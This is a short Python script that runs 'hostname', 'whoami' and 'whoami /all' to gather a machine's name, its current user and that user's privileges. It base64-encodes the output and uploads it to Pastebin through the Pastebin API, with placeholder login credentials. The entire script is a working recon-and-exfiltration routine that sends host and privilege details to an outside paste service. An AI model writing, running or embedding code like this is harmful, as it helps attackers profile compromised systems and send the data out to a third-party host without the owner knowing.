import base64
import requests
from subprocess import PIPE,Popen

# Print Hostname using "hostname" command
# Print logged-in users using "who" command
# Print permission using "ls -l" command

result = "Results\n---------------\n"
result += "Host name : "
process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
result += output.decode()

result += "Logged in user : "
process = Popen("whoami", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
result += output.decode()

result += "Permissions :  "
process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
result += output.decode()

print(result)

print("Encoded result: ")
encoded_result = base64.b64encode(result.encode())
print(encoded_result)

# Send to pastebin
# USE PASTEBIN API 

key = 'your_dev_key_here'
text = encoded_result
t_title = "title"
 
login_data = {
    'api_dev_key': key,
    'api_user_name': 'your_acc_username',
    'api_user_password': 'your_acc_password'
    }

data = {
    'api_option': 'paste',
    'api_dev_key':key,
    'api_paste_code':text,
    'api_paste_name':t_title,
    'api_user_key': None,
    }
 
login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
print("User token: ", login.text)
data['api_user_key'] = login.text
 
r = requests.post("https://pastebin.com/api/api_post.php", data=data)
print("Paste send: ", r.status_code if r.status_code != 200 else "OK/200")
print("Paste URL: ", r.text)